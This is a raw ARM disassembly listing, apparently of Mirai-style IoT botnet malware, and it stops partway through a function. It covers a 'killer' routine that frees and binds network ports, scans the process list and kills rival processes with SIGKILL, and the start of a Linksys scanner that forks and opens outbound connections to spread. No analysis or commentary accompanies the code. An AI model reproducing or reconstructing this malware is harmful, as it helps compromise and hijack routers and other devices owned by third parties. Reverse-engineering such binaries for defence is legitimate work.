   1080c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   10810:	e12fff1e 	bx	lr
   10814:	e3a02002 	mov	r2, #2
   10818:	e28d1c12 	add	r1, sp, #4608	; 0x1200
   1081c:	e28d3a01 	add	r3, sp, #4096	; 0x1000
   10820:	e3a00c85 	mov	r0, #34048	; 0x8500
   10824:	e1c12ab0 	strh	r2, [r1, #160]	; 0xa0
   10828:	e58352a4 	str	r5, [r3, #676]	; 0x2a4
   1082c:	e28000ce 	add	r0, r0, #206	; 0xce
   10830:	ebfffe7d 	bl	1022c <killer_kill_by_port>
   10834:	e3e03c7a 	mvn	r3, #31232	; 0x7a00
   10838:	e2433031 	sub	r3, r3, #49	; 0x31
   1083c:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   10840:	e3a00002 	mov	r0, #2
   10844:	e3a01001 	mov	r1, #1
   10848:	e1a02005 	mov	r2, r5
   1084c:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   10850:	eb0019ff 	bl	17054 <__GI_socket>
   10854:	e3700001 	cmn	r0, #1
   10858:	e1a04000 	mov	r4, r0
   1085c:	0a000006 	beq	1087c <killer_init+0xbc>
   10860:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   10864:	e2811020 	add	r1, r1, #32
   10868:	e3a02010 	mov	r2, #16
   1086c:	eb0018b1 	bl	16b38 <__GI_bind>
   10870:	e1a00004 	mov	r0, r4
   10874:	e3a01001 	mov	r1, #1
   10878:	eb001910 	bl	16cc0 <__GI_listen>
   1087c:	e3a00a09 	mov	r0, #36864	; 0x9000
   10880:	e280001f 	add	r0, r0, #31
   10884:	ebfffe68 	bl	1022c <killer_kill_by_port>
   10888:	e3e03c6f 	mvn	r3, #28416	; 0x6f00
   1088c:	e24330e0 	sub	r3, r3, #224	; 0xe0
   10890:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   10894:	e3a00002 	mov	r0, #2
   10898:	e3a01001 	mov	r1, #1
   1089c:	e1a02005 	mov	r2, r5
   108a0:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   108a4:	eb0019ea 	bl	17054 <__GI_socket>
   108a8:	e3700001 	cmn	r0, #1
   108ac:	e1a04000 	mov	r4, r0
   108b0:	0a000006 	beq	108d0 <killer_init+0x110>
   108b4:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   108b8:	e2811020 	add	r1, r1, #32
   108bc:	e3a02010 	mov	r2, #16
   108c0:	eb00189c 	bl	16b38 <__GI_bind>
   108c4:	e1a00004 	mov	r0, r4
   108c8:	e3a01001 	mov	r1, #1
   108cc:	eb0018fb 	bl	16cc0 <__GI_listen>
   108d0:	e3a00cbb 	mov	r0, #47872	; 0xbb00
   108d4:	e2800001 	add	r0, r0, #1
   108d8:	ebfffe53 	bl	1022c <killer_kill_by_port>
   108dc:	e3e03b11 	mvn	r3, #17408	; 0x4400
   108e0:	e24330fe 	sub	r3, r3, #254	; 0xfe
   108e4:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   108e8:	e3a00002 	mov	r0, #2
   108ec:	e3a01001 	mov	r1, #1
   108f0:	e1a02005 	mov	r2, r5
   108f4:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   108f8:	eb0019d5 	bl	17054 <__GI_socket>
   108fc:	e3700001 	cmn	r0, #1
   10900:	e1a04000 	mov	r4, r0
   10904:	0a000006 	beq	10924 <killer_init+0x164>
   10908:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   1090c:	e2811020 	add	r1, r1, #32
   10910:	e3a02010 	mov	r2, #16
   10914:	eb001887 	bl	16b38 <__GI_bind>
   10918:	e1a00004 	mov	r0, r4
   1091c:	e3a01001 	mov	r1, #1
   10920:	eb0018e6 	bl	16cc0 <__GI_listen>
   10924:	e3a04c5f 	mov	r4, #24320	; 0x5f00
   10928:	e2844091 	add	r4, r4, #145	; 0x91
   1092c:	e1a00004 	mov	r0, r4
   10930:	ebfffe3d 	bl	1022c <killer_kill_by_port>
   10934:	e28d3c12 	add	r3, sp, #4608	; 0x1200
   10938:	e1c34ab2 	strh	r4, [r3, #162]	; 0xa2
   1093c:	e3a00002 	mov	r0, #2
   10940:	e3a01001 	mov	r1, #1
   10944:	e1a02005 	mov	r2, r5
   10948:	eb0019c1 	bl	17054 <__GI_socket>
   1094c:	e3700001 	cmn	r0, #1
   10950:	e1a04000 	mov	r4, r0
   10954:	0a000006 	beq	10974 <killer_init+0x1b4>
   10958:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   1095c:	e2811020 	add	r1, r1, #32
   10960:	e3a02010 	mov	r2, #16
   10964:	eb001873 	bl	16b38 <__GI_bind>
   10968:	e1a00004 	mov	r0, r4
   1096c:	e3a01001 	mov	r1, #1
   10970:	eb0018d2 	bl	16cc0 <__GI_listen>
   10974:	e3a00c17 	mov	r0, #5888	; 0x1700
   10978:	ebfffe2b 	bl	1022c <killer_kill_by_port>
   1097c:	e3a03c17 	mov	r3, #5888	; 0x1700
   10980:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   10984:	e3a00002 	mov	r0, #2
   10988:	e3a01001 	mov	r1, #1
   1098c:	e1a02005 	mov	r2, r5
   10990:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   10994:	eb0019ae 	bl	17054 <__GI_socket>
   10998:	e3700001 	cmn	r0, #1
   1099c:	e1a04000 	mov	r4, r0
   109a0:	0a000006 	beq	109c0 <killer_init+0x200>
   109a4:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   109a8:	e2811020 	add	r1, r1, #32
   109ac:	e3a02010 	mov	r2, #16
   109b0:	eb001860 	bl	16b38 <__GI_bind>
   109b4:	e1a00004 	mov	r0, r4
   109b8:	e3a01001 	mov	r1, #1
   109bc:	eb0018bf 	bl	16cc0 <__GI_listen>
   109c0:	e3a00a05 	mov	r0, #20480	; 0x5000
   109c4:	ebfffe18 	bl	1022c <killer_kill_by_port>
   109c8:	e3a03a05 	mov	r3, #20480	; 0x5000
   109cc:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   109d0:	e3a00002 	mov	r0, #2
   109d4:	e3a01001 	mov	r1, #1
   109d8:	e1a02005 	mov	r2, r5
   109dc:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   109e0:	eb00199b 	bl	17054 <__GI_socket>
   109e4:	e3700001 	cmn	r0, #1
   109e8:	e1a04000 	mov	r4, r0
   109ec:	0a000006 	beq	10a0c <killer_init+0x24c>
   109f0:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   109f4:	e2811020 	add	r1, r1, #32
   109f8:	e3a02010 	mov	r2, #16
   109fc:	eb00184d 	bl	16b38 <__GI_bind>
   10a00:	e1a00004 	mov	r0, r4
   10a04:	e3a01001 	mov	r1, #1
   10a08:	eb0018ac 	bl	16cc0 <__GI_listen>
   10a0c:	e3a00c16 	mov	r0, #5632	; 0x1600
   10a10:	ebfffe05 	bl	1022c <killer_kill_by_port>
   10a14:	e3a03c16 	mov	r3, #5632	; 0x1600
   10a18:	e28dcc12 	add	ip, sp, #4608	; 0x1200
   10a1c:	e3a00002 	mov	r0, #2
   10a20:	e3a01001 	mov	r1, #1
   10a24:	e1a02005 	mov	r2, r5
   10a28:	e1cc3ab2 	strh	r3, [ip, #162]	; 0xa2
   10a2c:	eb001988 	bl	17054 <__GI_socket>
   10a30:	e3700001 	cmn	r0, #1
   10a34:	e1a04000 	mov	r4, r0
   10a38:	0a000006 	beq	10a58 <killer_init+0x298>
   10a3c:	e28d1d4a 	add	r1, sp, #4736	; 0x1280
   10a40:	e2811020 	add	r1, r1, #32
   10a44:	e3a02010 	mov	r2, #16
   10a48:	eb00183a 	bl	16b38 <__GI_bind>
   10a4c:	e1a00004 	mov	r0, r4
   10a50:	e3a01001 	mov	r1, #1
   10a54:	eb001899 	bl	16cc0 <__GI_listen>
   10a58:	e3a00005 	mov	r0, #5
   10a5c:	eb0024a2 	bl	19cec <__GI_sleep>
   10a60:	e3a00a01 	mov	r0, #4096	; 0x1000
   10a64:	eb001a0e 	bl	172a4 <malloc>
   10a68:	e59fc4b0 	ldr	ip, [pc, #1200]	; 10f20 <killer_init+0x760>
   10a6c:	e59f34b0 	ldr	r3, [pc, #1200]	; 10f24 <killer_init+0x764>
   10a70:	e1a02000 	mov	r2, r0
   10a74:	e5c25000 	strb	r5, [r2]
   10a78:	e3a00005 	mov	r0, #5
   10a7c:	e58c2000 	str	r2, [ip]
   10a80:	e5835000 	str	r5, [r3]
   10a84:	eb000aa5 	bl	13520 <table_unlock_val>
   10a88:	e3a00006 	mov	r0, #6
   10a8c:	eb000aa3 	bl	13520 <table_unlock_val>
   10a90:	e28d0030 	add	r0, sp, #48	; 0x30
   10a94:	e58d0004 	str	r0, [sp, #4]
   10a98:	e1a01005 	mov	r1, r5
   10a9c:	e3a00005 	mov	r0, #5
   10aa0:	eb000a6d 	bl	1345c <table_retrieve_val>
   10aa4:	e59d2004 	ldr	r2, [sp, #4]
   10aa8:	e2422020 	sub	r2, r2, #32
   10aac:	e1a01000 	mov	r1, r0
   10ab0:	e1a00002 	mov	r0, r2
   10ab4:	e58d2004 	str	r2, [sp, #4]
   10ab8:	eb001024 	bl	14b50 <util_strcpy>
   10abc:	e59d3004 	ldr	r3, [sp, #4]
   10ac0:	e0804003 	add	r4, r0, r3
   10ac4:	eb00243a 	bl	19bb4 <__getpid>
   10ac8:	e28d2d4a 	add	r2, sp, #4736	; 0x1280
   10acc:	e2822010 	add	r2, r2, #16
   10ad0:	e3a0100a 	mov	r1, #10
   10ad4:	eb00114f 	bl	15018 <util_itoa>
   10ad8:	e1a01000 	mov	r1, r0
   10adc:	e1a00004 	mov	r0, r4
   10ae0:	eb00101a 	bl	14b50 <util_strcpy>
   10ae4:	e1a01005 	mov	r1, r5
   10ae8:	e0804004 	add	r4, r0, r4
   10aec:	e3a00006 	mov	r0, #6
   10af0:	eb000a59 	bl	1345c <table_retrieve_val>
   10af4:	e1a01000 	mov	r1, r0
   10af8:	e1a00004 	mov	r0, r4
   10afc:	eb001013 	bl	14b50 <util_strcpy>
   10b00:	e1a01005 	mov	r1, r5
   10b04:	e1a06000 	mov	r6, r0
   10b08:	e59d0004 	ldr	r0, [sp, #4]
   10b0c:	eb0024ef 	bl	19ed0 <__GI___libc_open>
   10b10:	e3700001 	cmn	r0, #1
   10b14:	0affff3a 	beq	10804 <killer_init+0x44>
   10b18:	eb0024c8 	bl	19e40 <__GI___libc_close>
   10b1c:	e3a00005 	mov	r0, #5
   10b20:	eb000a56 	bl	13480 <table_lock_val>
   10b24:	e3a00006 	mov	r0, #6
   10b28:	eb000a54 	bl	13480 <table_lock_val>
   10b2c:	e59fc3ec 	ldr	ip, [pc, #1004]	; 10f20 <killer_init+0x760>
   10b30:	e3a02eff 	mov	r2, #4080	; 0xff0
   10b34:	e59c1000 	ldr	r1, [ip]
   10b38:	e282200f 	add	r2, r2, #15
   10b3c:	e59d0004 	ldr	r0, [sp, #4]
   10b40:	eb0015b4 	bl	16218 <__GI_readlink>
   10b44:	e3700001 	cmn	r0, #1
   10b48:	159f13d0 	ldrne	r1, [pc, #976]	; 10f20 <killer_init+0x760>
   10b4c:	15913000 	ldrne	r3, [r1]
   10b50:	17c35000 	strbne	r5, [r3, r0]
   10b54:	e59d2004 	ldr	r2, [sp, #4]
   10b58:	e0861004 	add	r1, r6, r4
   10b5c:	e0621001 	rsb	r1, r2, r1
   10b60:	e1a00002 	mov	r0, r2
   10b64:	eb001014 	bl	14bbc <util_zero>
   10b68:	e1a04007 	mov	r4, r7
   10b6c:	e58d500c 	str	r5, [sp, #12]
   10b70:	e3a05e19 	mov	r5, #400	; 0x190
   10b74:	e3a00005 	mov	r0, #5
   10b78:	eb000a68 	bl	13520 <table_unlock_val>
   10b7c:	e3a01000 	mov	r1, #0
   10b80:	e3a00005 	mov	r0, #5
   10b84:	eb000a34 	bl	1345c <table_retrieve_val>
   10b88:	eb00169b 	bl	165fc <__GI_opendir>
   10b8c:	e2508000 	subs	r8, r0, #0
   10b90:	0affff1b 	beq	10804 <killer_init+0x44>
   10b94:	e3a00005 	mov	r0, #5
   10b98:	eb000a38 	bl	13480 <table_lock_val>
   10b9c:	e1a00008 	mov	r0, r8
   10ba0:	eb0016f2 	bl	16770 <__GI_readdir>
   10ba4:	e3500000 	cmp	r0, #0
   10ba8:	0a000023 	beq	10c3c <killer_init+0x47c>
   10bac:	e5d0300b 	ldrb	r3, [r0, #11]
   10bb0:	e2433030 	sub	r3, r3, #48	; 0x30
   10bb4:	e3530009 	cmp	r3, #9
   10bb8:	8afffff7 	bhi	10b9c <killer_init+0x3dc>
   10bbc:	e280600b 	add	r6, r0, #11
   10bc0:	e1a00006 	mov	r0, r6
   10bc4:	eb00204f 	bl	18d08 <__GI_atoi>
   10bc8:	e59d300c 	ldr	r3, [sp, #12]
   10bcc:	e1550000 	cmp	r5, r0
   10bd0:	e2833001 	add	r3, r3, #1
   10bd4:	e1a07000 	mov	r7, r0
   10bd8:	e58d300c 	str	r3, [sp, #12]
   10bdc:	ba000019 	blt	10c48 <killer_init+0x488>
   10be0:	e3a00000 	mov	r0, #0
   10be4:	eb001600 	bl	163ec <__GI_time>
   10be8:	e0640000 	rsb	r0, r4, r0
   10bec:	e350000a 	cmp	r0, #10
   10bf0:	c3a05e19 	movgt	r5, #400	; 0x190
   10bf4:	caffffe8 	bgt	10b9c <killer_init+0x3dc>
   10bf8:	e3570e19 	cmp	r7, #400	; 0x190
   10bfc:	daffffe6 	ble	10b9c <killer_init+0x3dc>
   10c00:	e59f3320 	ldr	r3, [pc, #800]	; 10f28 <killer_init+0x768>
   10c04:	e59dc00c 	ldr	ip, [sp, #12]
   10c08:	e0820c93 	umull	r0, r2, r3, ip
   10c0c:	e1a021a2 	lsr	r2, r2, #3
   10c10:	e1a03182 	lsl	r3, r2, #3
   10c14:	e1a02082 	lsl	r2, r2, #1
   10c18:	e0822003 	add	r2, r2, r3
   10c1c:	e15c0002 	cmp	ip, r2
   10c20:	1affffdd 	bne	10b9c <killer_init+0x3dc>
   10c24:	e3a00001 	mov	r0, #1
   10c28:	eb00242f 	bl	19cec <__GI_sleep>
   10c2c:	e1a00008 	mov	r0, r8
   10c30:	eb0016ce 	bl	16770 <__GI_readdir>
   10c34:	e3500000 	cmp	r0, #0
   10c38:	1affffdb 	bne	10bac <killer_init+0x3ec>
   10c3c:	e1a00008 	mov	r0, r8
   10c40:	eb0015f5 	bl	1641c <__GI_closedir>
   10c44:	eaffffca 	b	10b74 <killer_init+0x3b4>
   10c48:	e3a00000 	mov	r0, #0
   10c4c:	eb0015e6 	bl	163ec <__GI_time>
   10c50:	e58d0008 	str	r0, [sp, #8]
   10c54:	e3a00005 	mov	r0, #5
   10c58:	eb000a30 	bl	13520 <table_unlock_val>
   10c5c:	e3a00006 	mov	r0, #6
   10c60:	eb000a2e 	bl	13520 <table_unlock_val>
   10c64:	e3a01000 	mov	r1, #0
   10c68:	e3a00005 	mov	r0, #5
   10c6c:	eb0009fa 	bl	1345c <table_retrieve_val>
   10c70:	e28d9d49 	add	r9, sp, #4672	; 0x1240
   10c74:	e2899010 	add	r9, r9, #16
   10c78:	e1a01000 	mov	r1, r0
   10c7c:	e1a00009 	mov	r0, r9
   10c80:	eb000fb2 	bl	14b50 <util_strcpy>
   10c84:	e0805009 	add	r5, r0, r9
   10c88:	e1a01006 	mov	r1, r6
   10c8c:	e1a00005 	mov	r0, r5
   10c90:	eb000fae 	bl	14b50 <util_strcpy>
   10c94:	e3a01000 	mov	r1, #0
   10c98:	e1a04000 	mov	r4, r0
   10c9c:	e3a00006 	mov	r0, #6
   10ca0:	eb0009ed 	bl	1345c <table_retrieve_val>
   10ca4:	e1a01000 	mov	r1, r0
   10ca8:	e0840005 	add	r0, r4, r5
   10cac:	eb000fa7 	bl	14b50 <util_strcpy>
   10cb0:	e3a01000 	mov	r1, #0
   10cb4:	e3a00005 	mov	r0, #5
   10cb8:	eb0009e7 	bl	1345c <table_retrieve_val>
   10cbc:	e28dbc12 	add	fp, sp, #4608	; 0x1200
   10cc0:	e28bb010 	add	fp, fp, #16
   10cc4:	e1a01000 	mov	r1, r0
   10cc8:	e1a0000b 	mov	r0, fp
   10ccc:	eb000f9f 	bl	14b50 <util_strcpy>
   10cd0:	e080500b 	add	r5, r0, fp
   10cd4:	e1a01006 	mov	r1, r6
   10cd8:	e1a00005 	mov	r0, r5
   10cdc:	eb000f9b 	bl	14b50 <util_strcpy>
   10ce0:	e3a01000 	mov	r1, #0
   10ce4:	e1a04000 	mov	r4, r0
   10ce8:	e3a0000c 	mov	r0, #12
   10cec:	eb0009da 	bl	1345c <table_retrieve_val>
   10cf0:	e1a01000 	mov	r1, r0
   10cf4:	e0840005 	add	r0, r4, r5
   10cf8:	eb000f94 	bl	14b50 <util_strcpy>
   10cfc:	e3a00005 	mov	r0, #5
   10d00:	eb0009de 	bl	13480 <table_lock_val>
   10d04:	e3a00006 	mov	r0, #6
   10d08:	eb0009dc 	bl	13480 <table_lock_val>
   10d0c:	e3a02eff 	mov	r2, #4080	; 0xff0
   10d10:	e1a00009 	mov	r0, r9
   10d14:	e59d1004 	ldr	r1, [sp, #4]
   10d18:	e282200f 	add	r2, r2, #15
   10d1c:	eb00153d 	bl	16218 <__GI_readlink>
   10d20:	e3700001 	cmn	r0, #1
   10d24:	0a00001b 	beq	10d98 <killer_init+0x5d8>
   10d28:	e59d1004 	ldr	r1, [sp, #4]
   10d2c:	e3a03000 	mov	r3, #0
   10d30:	e7c13000 	strb	r3, [r1, r0]
   10d34:	eb00239e 	bl	19bb4 <__getpid>
   10d38:	e1500007 	cmp	r0, r7
   10d3c:	0a000008 	beq	10d64 <killer_init+0x5a4>
   10d40:	eb0014d8 	bl	160a8 <getppid>
   10d44:	e1500007 	cmp	r0, r7
   10d48:	0a000005 	beq	10d64 <killer_init+0x5a4>
   10d4c:	e59f21cc 	ldr	r2, [pc, #460]	; 10f20 <killer_init+0x760>
   10d50:	e59d0004 	ldr	r0, [sp, #4]
   10d54:	e5921000 	ldr	r1, [r2]
   10d58:	eb001069 	bl	14f04 <util_strcmp>
   10d5c:	e3500000 	cmp	r0, #0
   10d60:	0a000002 	beq	10d70 <killer_init+0x5b0>
   10d64:	e59d4008 	ldr	r4, [sp, #8]
   10d68:	e1a05007 	mov	r5, r7
   10d6c:	eaffff8a 	b	10b9c <killer_init+0x3dc>
   10d70:	e1a01000 	mov	r1, r0
   10d74:	e59d0004 	ldr	r0, [sp, #4]
   10d78:	eb002454 	bl	19ed0 <__GI___libc_open>
   10d7c:	e3700001 	cmn	r0, #1
   10d80:	e1a04000 	mov	r4, r0
   10d84:	01a00007 	moveq	r0, r7
   10d88:	03a01009 	moveq	r1, #9
   10d8c:	0b001502 	bleq	1619c <__GI_kill>
   10d90:	e1a00004 	mov	r0, r4
   10d94:	eb002429 	bl	19e40 <__GI___libc_close>
   10d98:	e1a00009 	mov	r0, r9
   10d9c:	e3a01000 	mov	r1, #0
   10da0:	eb00244a 	bl	19ed0 <__GI___libc_open>
   10da4:	e3700001 	cmn	r0, #1
   10da8:	e1a0a000 	mov	sl, r0
   10dac:	0a000043 	beq	10ec0 <killer_init+0x700>
   10db0:	e3a0000b 	mov	r0, #11
   10db4:	eb0009d9 	bl	13520 <table_unlock_val>
   10db8:	e3a0000a 	mov	r0, #10
   10dbc:	eb0009d7 	bl	13520 <table_unlock_val>
   10dc0:	e28d6a01 	add	r6, sp, #4096	; 0x1000
   10dc4:	e2866010 	add	r6, r6, #16
   10dc8:	e1a0000a 	mov	r0, sl
   10dcc:	e1a01006 	mov	r1, r6
   10dd0:	e3a02c02 	mov	r2, #512	; 0x200
   10dd4:	eb002485 	bl	19ff0 <__GI___libc_read>
   10dd8:	e2504000 	subs	r4, r0, #0
   10ddc:	da000047 	ble	10f00 <killer_init+0x740>
   10de0:	e3a01000 	mov	r1, #0
   10de4:	e3a0000b 	mov	r0, #11
   10de8:	eb00099b 	bl	1345c <table_retrieve_val>
   10dec:	e3a01000 	mov	r1, #0
   10df0:	e1a05000 	mov	r5, r0
   10df4:	e3a0000b 	mov	r0, #11
   10df8:	eb000997 	bl	1345c <table_retrieve_val>
   10dfc:	eb000f49 	bl	14b28 <util_strlen>
   10e00:	e1540000 	cmp	r4, r0
   10e04:	a3a0c000 	movge	ip, #0
   10e08:	a1a01004 	movge	r1, r4
   10e0c:	a1a0e00c 	movge	lr, ip
   10e10:	ba000009 	blt	10e3c <killer_init+0x67c>
   10e14:	e2511001 	subs	r1, r1, #1
   10e18:	3a000007 	bcc	10e3c <killer_init+0x67c>
   10e1c:	e7d5200e 	ldrb	r2, [r5, lr]
   10e20:	e7dc3006 	ldrb	r3, [ip, r6]
   10e24:	e1530002 	cmp	r3, r2
   10e28:	13a0e000 	movne	lr, #0
   10e2c:	0a000017 	beq	10e90 <killer_init+0x6d0>
   10e30:	e2511001 	subs	r1, r1, #1
   10e34:	e28cc001 	add	ip, ip, #1
   10e38:	2afffff7 	bcs	10e1c <killer_init+0x65c>
   10e3c:	e3a01000 	mov	r1, #0
   10e40:	e3a0000a 	mov	r0, #10
   10e44:	eb000984 	bl	1345c <table_retrieve_val>
   10e48:	e3a01000 	mov	r1, #0
   10e4c:	e1a05000 	mov	r5, r0
   10e50:	e3a0000a 	mov	r0, #10
   10e54:	eb000980 	bl	1345c <table_retrieve_val>
   10e58:	eb000f32 	bl	14b28 <util_strlen>
   10e5c:	e1540000 	cmp	r4, r0
   10e60:	a3a01000 	movge	r1, #0
   10e64:	a1a0c001 	movge	ip, r1
   10e68:	baffffd6 	blt	10dc8 <killer_init+0x608>
   10e6c:	e2544001 	subs	r4, r4, #1
   10e70:	3affffd4 	bcc	10dc8 <killer_init+0x608>
   10e74:	e7d5200c 	ldrb	r2, [r5, ip]
   10e78:	e7d13006 	ldrb	r3, [r1, r6]
   10e7c:	e1530002 	cmp	r3, r2
   10e80:	13a0c000 	movne	ip, #0
   10e84:	0a000018 	beq	10eec <killer_init+0x72c>
   10e88:	e2811001 	add	r1, r1, #1
   10e8c:	eafffff6 	b	10e6c <killer_init+0x6ac>
   10e90:	e28ee001 	add	lr, lr, #1
   10e94:	e150000e 	cmp	r0, lr
   10e98:	1affffe4 	bne	10e30 <killer_init+0x670>
   10e9c:	e3a0000b 	mov	r0, #11
   10ea0:	eb000976 	bl	13480 <table_lock_val>
   10ea4:	e3a0000a 	mov	r0, #10
   10ea8:	eb000974 	bl	13480 <table_lock_val>
   10eac:	e1a0000a 	mov	r0, sl
   10eb0:	eb0023e2 	bl	19e40 <__GI___libc_close>
   10eb4:	e1a00007 	mov	r0, r7
   10eb8:	e3a01009 	mov	r1, #9
   10ebc:	eb0014b6 	bl	1619c <__GI_kill>
   10ec0:	e1a00009 	mov	r0, r9
   10ec4:	e3a01040 	mov	r1, #64	; 0x40
   10ec8:	eb000f3b 	bl	14bbc <util_zero>
   10ecc:	e1a0000b 	mov	r0, fp
   10ed0:	e3a01040 	mov	r1, #64	; 0x40
   10ed4:	eb000f38 	bl	14bbc <util_zero>
   10ed8:	e3a00001 	mov	r0, #1
   10edc:	eb002382 	bl	19cec <__GI_sleep>
   10ee0:	e59d4008 	ldr	r4, [sp, #8]
   10ee4:	e1a05007 	mov	r5, r7
   10ee8:	eaffff2b 	b	10b9c <killer_init+0x3dc>
   10eec:	e28cc001 	add	ip, ip, #1
   10ef0:	e150000c 	cmp	r0, ip
   10ef4:	0affffe8 	beq	10e9c <killer_init+0x6dc>
   10ef8:	e2811001 	add	r1, r1, #1
   10efc:	eaffffda 	b	10e6c <killer_init+0x6ac>
   10f00:	e3a0000b 	mov	r0, #11
   10f04:	eb00095d 	bl	13480 <table_lock_val>
   10f08:	e3a0000a 	mov	r0, #10
   10f0c:	eb00095b 	bl	13480 <table_lock_val>
   10f10:	e1a0000a 	mov	r0, sl
   10f14:	eb0023c9 	bl	19e40 <__GI___libc_close>
   10f18:	eaffffe8 	b	10ec0 <killer_init+0x700>
   10f1c:	0002b8b8 	.word	0x0002b8b8
   10f20:	0002b8b4 	.word	0x0002b8b4
   10f24:	00028cf8 	.word	0x00028cf8
   10f28:	cccccccd 	.word	0xcccccccd

00010f2c <linksys_scanner_kill>:
   10f2c:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   10f30:	e59f3018 	ldr	r3, [pc, #24]	; 10f50 <linksys_scanner_kill+0x24>
   10f34:	e24dd004 	sub	sp, sp, #4
   10f38:	e5930000 	ldr	r0, [r3]
   10f3c:	e3a01009 	mov	r1, #9
   10f40:	eb001495 	bl	1619c <__GI_kill>
   10f44:	e28dd004 	add	sp, sp, #4
   10f48:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   10f4c:	e12fff1e 	bx	lr
   10f50:	00028cfc 	.word	0x00028cfc

00010f54 <linksys_setup_connection>:
   10f54:	e92d4070 	push	{r4, r5, r6, lr}
   10f58:	e1a05000 	mov	r5, r0
   10f5c:	e5900000 	ldr	r0, [r0]
   10f60:	e24dd010 	sub	sp, sp, #16
   10f64:	e3a06000 	mov	r6, #0
   10f68:	e3700001 	cmn	r0, #1
   10f6c:	e58d6000 	str	r6, [sp]
   10f70:	e58d6004 	str	r6, [sp, #4]
   10f74:	e58d6008 	str	r6, [sp, #8]
   10f78:	e58d600c 	str	r6, [sp, #12]
   10f7c:	1b0023af 	blne	19e40 <__GI___libc_close>
   10f80:	e3a00002 	mov	r0, #2
   10f84:	e3a01001 	mov	r1, #1
   10f88:	e1a02006 	mov	r2, r6
   10f8c:	eb001830 	bl	17054 <__GI_socket>
   10f90:	e3700001 	cmn	r0, #1
   10f94:	e5850000 	str	r0, [r5]
   10f98:	0a00001e 	beq	11018 <linksys_setup_connection+0xc4>
   10f9c:	e2850018 	add	r0, r5, #24
   10fa0:	e3a01b01 	mov	r1, #1024	; 0x400
   10fa4:	e5856014 	str	r6, [r5, #20]
   10fa8:	eb000f03 	bl	14bbc <util_zero>
   10fac:	e5954000 	ldr	r4, [r5]
   10fb0:	e1a02006 	mov	r2, r6
   10fb4:	e3a01003 	mov	r1, #3
   10fb8:	e1a00004 	mov	r0, r4
   10fbc:	eb0013fc 	bl	15fb4 <__GI___libc_fcntl>
   10fc0:	e3a01004 	mov	r1, #4
   10fc4:	e3802b02 	orr	r2, r0, #2048	; 0x800
   10fc8:	e1a00004 	mov	r0, r4
   10fcc:	eb0013f8 	bl	15fb4 <__GI___libc_fcntl>
   10fd0:	e59f304c 	ldr	r3, [pc, #76]	; 11024 <linksys_setup_connection+0xd0>
   10fd4:	e5931000 	ldr	r1, [r3]
   10fd8:	e595300c 	ldr	r3, [r5, #12]
   10fdc:	e58d3004 	str	r3, [sp, #4]
   10fe0:	e3a03002 	mov	r3, #2
   10fe4:	e5952008 	ldr	r2, [r5, #8]
   10fe8:	e1cd30b0 	strh	r3, [sp]
   10fec:	e2422002 	sub	r2, r2, #2
   10ff0:	e1d531b0 	ldrh	r3, [r5, #16]
   10ff4:	e3520001 	cmp	r2, #1
   10ff8:	e1cd30b2 	strh	r3, [sp, #2]
   10ffc:	83a03001 	movhi	r3, #1
   11000:	e5851004 	str	r1, [r5, #4]
   11004:	85853008 	strhi	r3, [r5, #8]
   11008:	e5950000 	ldr	r0, [r5]
   1100c:	e1a0100d 	mov	r1, sp
   11010:	e3a02010 	mov	r2, #16
   11014:	eb0016e9 	bl	16bc0 <__libc_connect>
   11018:	e28dd010 	add	sp, sp, #16
   1101c:	e8bd4070 	pop	{r4, r5, r6, lr}
   11020:	e12fff1e 	bx	lr
   11024:	00028d2c 	.word	0x00028d2c

00011028 <linksys_scanner_init>:
   11028:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1102c:	e24dde72 	sub	sp, sp, #1824	; 0x720
   11030:	e3a03000 	mov	r3, #0
   11034:	e24dd00c 	sub	sp, sp, #12
   11038:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   1103c:	eb0021c3 	bl	19750 <__libc_fork>
   11040:	e3700001 	cmn	r0, #1
   11044:	13a03000 	movne	r3, #0
   11048:	03a03001 	moveq	r3, #1
   1104c:	e3500000 	cmp	r0, #0
   11050:	d1a04003 	movle	r4, r3
   11054:	c3834001 	orrgt	r4, r3, #1
   11058:	e59f3a3c 	ldr	r3, [pc, #2620]	; 11a9c <linksys_scanner_init+0xa74>
   1105c:	e3540000 	cmp	r4, #0
   11060:	e5830000 	str	r0, [r3]
   11064:	0a000003 	beq	11078 <linksys_scanner_init+0x50>
   11068:	e28ddfcb 	add	sp, sp, #812	; 0x32c
   1106c:	e28ddb01 	add	sp, sp, #1024	; 0x400
   11070:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   11074:	e12fff1e 	bx	lr
   11078:	eb000f59 	bl	14de4 <util_local_addr>
   1107c:	e59f1a1c 	ldr	r1, [pc, #2588]	; 11aa0 <linksys_scanner_init+0xa78>
   11080:	e5810000 	str	r0, [r1]
   11084:	eb000572 	bl	12654 <rand_init>
   11088:	e1a00004 	mov	r0, r4
   1108c:	eb0014d6 	bl	163ec <__GI_time>
   11090:	e59f2a0c 	ldr	r2, [pc, #2572]	; 11aa4 <linksys_scanner_init+0xa7c>
   11094:	e3a01b03 	mov	r1, #3072	; 0xc00
   11098:	e5820000 	str	r0, [r2]
   1109c:	e3a00c01 	mov	r0, #256	; 0x100
   110a0:	eb001acd 	bl	17bdc <calloc>
   110a4:	e59f39fc 	ldr	r3, [pc, #2556]	; 11aa8 <linksys_scanner_init+0xa80>
   110a8:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   110ac:	e5830000 	str	r0, [r3]
